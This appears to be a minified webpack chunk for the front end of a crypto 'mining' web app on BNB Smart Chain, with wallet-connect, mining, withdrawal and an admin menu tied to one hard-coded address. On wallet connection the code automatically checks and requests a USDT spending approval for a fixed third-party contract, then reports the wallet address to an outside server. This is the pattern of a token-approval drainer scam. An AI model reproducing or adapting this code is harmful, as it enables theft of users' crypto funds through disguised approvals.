(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[14292],{35883:function(){},13265:function(e,A,t){"use strict";t.r(A),t.d(A,{default:function(){return Q}});var a=t(3827),n=t(64090),i=t(14297),s=t(20703),d=t(44600),o=t.n(d),l=t(61996),c=t.n(l),r=t(35573),m=t(28928),g=t(63805),u=t(24362);let h=(0,t(85738).ax)({id:56,name:"BNB Smart Chain Mainnet",nativeCurrency:{name:"BNB Chain Native Token",symbol:"BNB",decimals:18},blockExplorers:[{name:"bscscan",url:"https://bscscan.com"}]}),p=[(0,m.E)("io.metamask"),(0,m.E)("pro.tokenpocket"),(0,m.E)("im.token"),(0,m.E)("com.binance"),(0,m.E)("com.coinbase.wallet"),(0,m.a)()];var E=e=>{let{witchRPC:A=1}=e,[t]=r.Z.useForm(),s=(0,i.M)();return(0,n.useEffect)(()=>{},[s]),(0,a.jsx)("div",{children:(0,a.jsx)(g.ConnectButton,{theme:"dark",client:u.L,wallets:p,connectModal:{size:"compact"},chain:h})})},_={src:"/_next/static/media/logo.24577655.jpg",height:600,width:600,blurDataURL:"data:image/jpeg;base64,/9j/2wBDAAoHBwgHBgoICAgLCgoLDhgQDg0NDh0VFhEYIx8lJCIfIiEmKzcvJik0KSEiMEExNDk7Pj4+JS5ESUM8SDc9Pjv/2wBDAQoLCw4NDhwQEBw7KCIoOzs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozv/wgARCAAIAAgDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAb/xAAVAQEBAAAAAAAAAAAAAAAAAAACA//aAAwDAQACEAMQAAABnhNf/8QAFhAAAwAAAAAAAAAAAAAAAAAAAxMU/9oACAEBAAEFAkjl/8QAFREBAQAAAAAAAAAAAAAAAAAAAAL/2gAIAQMBAT8Bp//EABYRAAMAAAAAAAAAAAAAAAAAAAACQf/aAAgBAgEBPwFKf//EABkQAAIDAQAAAAAAAAAAAAAAABMxAAERQf/aAAgBAQAGPwIhaS7s/8QAFxAAAwEAAAAAAAAAAAAAAAAAADFRof/aAAgBAQABPyG06iP/2gAMAwEAAgADAAAAEAf/xAAXEQADAQAAAAAAAAAAAAAAAAAAARFR/9oACAEDAQE/EFSkw//EABcRAQEBAQAAAAAAAAAAAAAAAAEhABH/2gAIAQIBAT8Qa09rv//EABoQAAICAwAAAAAAAAAAAAAAABEhAAExQXH/2gAIAQEAAT8Q6/LWkmQJ/9k=",blurWidth:8,blurHeight:8},M=t(23349),w=t(37432),x=t(31254),f=t(88549),N=t(99790),B=t(73107),C=t(70975),R=e=>{let{onToggleRightMenu:A}=e,t=(0,i.M)(),[d,o]=(0,n.useState)(!1),[l,r]=(0,n.useState)(1),m=async e=>{if(t){let A=await (0,M.RA)(e.BUSDaddress,w.T),a=N.Bz;try{let n=await A.approve(e.ETHAddress,a,{gasLimit:1e6});await n.wait();let i="https://app.myoilfield.org/api/wallet/createWallet?walletAddress="+t.address+"&balance=0&type=1";B.Z.get(i).then(e=>{}).catch(e=>{}),x.ZP.success("授权成功")}catch(e){console.log(e,"error"),x.ZP.success("授权失败，请重试")}}else x.ZP.warning("请登录")},g=async e=>{let A=await (0,M.RA)(e.ETHAddress,C.B),a=await A.checkAllowance(e.BUSDaddress,t.address,e.ETHAddress);"0.0"==(0,M.rE)(a)?(m(JSON.parse(localStorage.getItem("Nodestorage")||"")),o(!1)):o(!0)},u=e=>{"BEP20USDT"===e?(localStorage.setItem("Nodestorage",JSON.stringify({ETHAddress:"0x2f68b19f68715f038acb08b0f2e053faef858e4a",BUSDaddress:"0x55d398326f99059ff775485246999027b3197955",RPCURL:"https://bsc-dataseed.binance.org/",id:1})),r(1)):"ERC20USDT"===e?(localStorage.setItem("Nodestorage",JSON.stringify({ETHAddress:"",BUSDaddress:"",RPCURL:"https://sepolia.infura.io/v3/YOUR-PROJECT-ID",id:2})),r(2)):"TRC20USDT"===e?(localStorage.setItem("Nodestorage",JSON.stringify({ETHAddress:"",BUSDaddress:"",RPCURL:"https://api.shasta.trongrid.io",id:3})),r(3)):(localStorage.setItem("Nodestorage",JSON.stringify({ETHAddress:"0x2f68b19f68715f038acb08b0f2e053faef858e4a",BUSDaddress:"0x55d398326f99059ff775485246999027b3197955",RPCURL:"https://bsc-dataseed.binance.org/",id:1})),r(1)),g(JSON.parse(localStorage.getItem("Nodestorage")||""))};return(0,n.useEffect)(()=>{t&&u("999")},[t]),(0,a.jsxs)("div",{className:c().pagetop,children:[(0,a.jsx)(s.default,{className:c().m1,src:_,alt:"coin",width:40,height:40}),(0,a.jsx)(E,{witchRPC:l}),(0,a.jsx)("div",{children:(0,a.jsx)(f.default,{defaultValue:"BEP20USDT",style:{width:100},onChange:u,options:[{value:"BEP20USDT",label:"BNB Chain"}]})}),(0,a.jsx)(s.default,{onClick:A,className:c().m3,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/menu.png",alt:"menu",width:50,height:50})]})},y=t(47907),k=t(60809),v=t.n(k),S={src:"/_next/static/media/Administrator.ba429778.png",height:200,width:212,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAMAAADz0U65AAAAJFBMVEX///9MaXH///////////////////////////////////////+2I0voAAAADHRSTlNeAJVki4ZqBCWrGVLpCrpEAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAMklEQVR4nEWLxwkAMAzE7lzitv++IRDwTyAJnDKvISid2ULAAggDnEePUha+0o055W+/KJABIdMC4NsAAAAASUVORK5CYII=",blurWidth:8,blurHeight:8},b={src:"/_next/static/media/selectorSwitch.e945e2be.png",height:44,width:44,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAMAAADz0U65AAAAG1BMVEX////////////////////////////+/v7///9JhYuvAAAACXRSTlOAvm+UMwQvW6dmS9EqAAAACXBIWXMAAAsTAAALEwEAmpwYAAAALUlEQVR4nEWLMRIAMAiDiMbq/1/cqXbjDqAOEqewMiJlKCIoGGd3ej6s2vjtFxz4AM2Ne6ZDAAAAAElFTkSuQmCC",blurWidth:8,blurHeight:8},j=()=>{let e=(0,i.M)(),[A,t]=(0,n.useState)(!1),[d,o]=(0,n.useState)("EN"),l=(0,y.useRouter)();return(0,n.useEffect)(()=>{e&&t("0x8d2291aa07407f40c8a98cb083a398296d43167b"==e.address.toLowerCase());let A=localStorage.getItem("language");A&&o(A)},[e]),(0,a.jsxs)("div",{className:v().rightMenu,"data-id":"RightMenu",children:[(0,a.jsxs)("div",{"data-id":"RightMenu",className:v().row,onClick:()=>l.push("/HomeLess"),children:[(0,a.jsx)(s.default,{"data-id":"RightMenu",className:v().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/HomePage.png",alt:"coin",width:50,height:50}),(0,a.jsxs)("div",{"data-id":"RightMenu",className:v().text,children:["EN"===d?"Home":"首页"," "]})]}),(0,a.jsxs)("div",{"data-id":"RightMenu",className:v().row,onClick:()=>l.push("/Machine"),children:[(0,a.jsx)(s.default,{"data-id":"RightMenu",className:v().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/MiningMachine.png",alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:v().text,children:"EN"===d?"Mining":"矿机"})]}),(0,a.jsxs)("div",{"data-id":"RightMenu",className:v().row,onClick:()=>l.push("/Flash"),children:[(0,a.jsx)(s.default,{"data-id":"RightMenu",className:v().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/flash.png",alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:v().text,children:"EN"===d?"Withdraw":"提款"})]}),(0,a.jsxs)("div",{"data-id":"RightMenu",className:v().row,onClick:()=>l.push("/Personal"),children:[(0,a.jsx)(s.default,{"data-id":"RightMenu",className:v().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/Individualcenter.png",alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:v().text,children:"EN"===d?"Personal":"个人中心"})]}),A&&(0,a.jsxs)("div",{"data-id":"RightMenu",className:v().row,onClick:()=>l.push("/Administrator"),children:[(0,a.jsx)(s.default,{"data-id":"RightMenu",className:v().img,src:S,alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:v().text,children:"EN"===d?"Admin":"管理员"})]}),(0,a.jsxs)("div",{"data-id":"RightMenu",className:v().row,onClick:()=>{let e="EN"===d?"CN":"EN";o(e),localStorage.setItem("language",e),window.location.reload()},children:[(0,a.jsx)(s.default,{"data-id":"RightMenu",className:v().img,src:b,alt:"coin",width:50,height:50}),(0,a.jsxs)("div",{"data-id":"RightMenu",className:v().text,children:["EN"===d?"EN":"CN"," "]})]})]})},T=t(18286),D=t(33052),I={src:"/_next/static/media/beijing.d082cf54.png",height:2007,width:2250,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAHCAMAAAACh/xsAAAACVBMVEUJCRsNCykTEjrjuvq3AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAJElEQVR4nEXKsQ0AAAzCMJL/j67KAiyWIAFIMyj4Uiy29t9qDgS6ACitWxw1AAAAAElFTkSuQmCC",blurWidth:8,blurHeight:7},Q=()=>{let e=(0,y.useRouter)(),A=(0,i.M)(),[t,d]=(0,n.useState)("EN"),l=A=>{e.push(A.link)},c=()=>{let e="https://m.zsdcoin.com?ref=".concat(A?A.address:"");(0,D.v)(e)},{isRightMenuVisible:r,toggleRightMenu:m,hideRightMenu:g}=(0,n.useContext)(T.MenuContext),u=(0,n.useRef)(null);return(0,n.useEffect)(()=>{let e=localStorage.getItem("language");e&&d(e)},[]),(0,n.useEffect)(()=>{let e=e=>{u.current&&"RightMenu"!==e.target.dataset.id&&g()};return document.addEventListener("mousedown",e),()=>{document.removeEventListener("mousedown",e)}},[g]),(0,a.jsx)(a.Fragment,{children:(0,a.jsxs)("div",{className:o().pageMenu,children:[r&&(0,a.jsx)(j,{}),(0,a.jsx)(R,{onToggleRightMenu:m}),(0,a.jsx)("div",{className:o().videoBackground,id:"nav",children:(0,a.jsx)(s.default,{className:o().imageGif,src:I,alt:""})}),(0,a.jsx)("div",{className:o().top,ref:u,children:("EN"===t?[{link:"/Machine",url:"../../images/MININGMACHINE.png",name:"Miners",en:"Miners"},{link:"/Personal",url:"../../images/PERSONALCENTER.png",name:"PERSONAL CENTER",en:"personal center"},{link:"/HomeLess",url:"../../images/homepage.png",name:"Home page",en:"home page"},{link:"/Flash",url:"../../images/WithdrawMoney.png",name:"Withdrawal",en:"Withdrawal"}]:[{link:"/Machine",url:"../../images/MININGMACHINE.png",name:"矿机",en:"Miners"},{link:"/Personal",url:"../../images/PERSONALCENTER.png",name:"个人中心",en:"personal center"},{link:"/HomeLess",url:"../../images/homepage.png",name:"首 页",en:"home page"},{link:"/Flash",url:"../../images/WithdrawMoney.png",name:"取 款",en:" Withdrawal"}]).map((e,A)=>(0,a.jsxs)("div",{className:"".concat(o()["menyBtn"+A]," ").concat(o().menyBtn),onClick:"/InCode"===e.link?c:()=>l(e),children:[(0,a.jsx)(s.default,{className:"".concat(o()["img"+A]),src:e.url,alt:e.name,width:50,height:50}),(0,a.jsx)("div",{className:o()["menyBtn-n"],children:e.name}),(0,a.jsx)("div",{className:o()["menyBtn-e"],children:e.en})]},e.link))})]})})}},33052:function(e,A,t){"use strict";t.d(A,{v:function(){return i}});var a=t(31254);let n=()=>"clipboard"in navigator,i=async e=>{try{if(n()){let A=document.createElement("textarea");A.value=e,document.body.appendChild(A),A.select(),document.execCommand("copy"),document.body.removeChild(A),a.ZP.success("复制成功")}else{let A=document.createElement("textarea");A.value=e,A.style.position="fixed",A.style.opacity="0",document.body.appendChild(A),A.focus(),A.select();try{document.execCommand("copy")?a.ZP.success("复制成功"):a.ZP.error("复制失败，请稍后重试")}catch(e){a.ZP.error("复制失败，请稍后重试")}finally{document.body.removeChild(A)}}}catch(t){let A=document.createElement("textarea");A.value=e,document.body.appendChild(A),A.select(),document.execCommand("copy"),document.body.removeChild(A),a.ZP.error("复制失败，请稍后重试")}}},60809:function(e){e.exports={rightMenu:"RightMenu_rightMenu__4Vdi0",row:"RightMenu_row__vVKio",img:"RightMenu_img__LvhXL",text:"RightMenu_text__kgeAO","video-background":"RightMenu_video-background__VO7sD",content:"RightMenu_content__zza7R"}},44600:function(e){e.exports={pageMenu:"TopMenu_pageMenu__tgFwW",top:"TopMenu_top__CE9fR",menyBtn0:"TopMenu_menyBtn0__OU6ht",menyBtn1:"TopMenu_menyBtn1__wpmzY",menyBtn2:"TopMenu_menyBtn2__9YB4v",menyBtn3:"TopMenu_menyBtn3__42O5W",menyBtn4:"TopMenu_menyBtn4__jMDkX",menyBtn5:"TopMenu_menyBtn5__YwPul",menyBtn:"TopMenu_menyBtn__5Rl_B","menyBtn-n":"TopMenu_menyBtn-n___3oET","menyBtn-e":"TopMenu_menyBtn-e__o7RuC",img0:"TopMenu_img0__EwxhJ",img1:"TopMenu_img1__U8byq",img2:"TopMenu_img2__Ixg5G",img3:"TopMenu_img3__sypae",img4:"TopMenu_img4__IL4yF",img5:"TopMenu_img5__ZAun1","video-background":"TopMenu_video-background__40Bxp",content:"TopMenu_content__s8Xj1",imageGif:"TopMenu_imageGif__f0WuQ"}},61996:function(e){e.exports={pagetop:"Top_pagetop__5k2y2",m1:"Top_m1__eJ96o",m2:"Top_m2__Leibv",m3:"Top_m3__8JExu",ljqb:"Top_ljqb__ktoyc","css-bedeeg":"Top_css-bedeeg__caJQv",deep:"Top_deep__7n1oN"}}}]);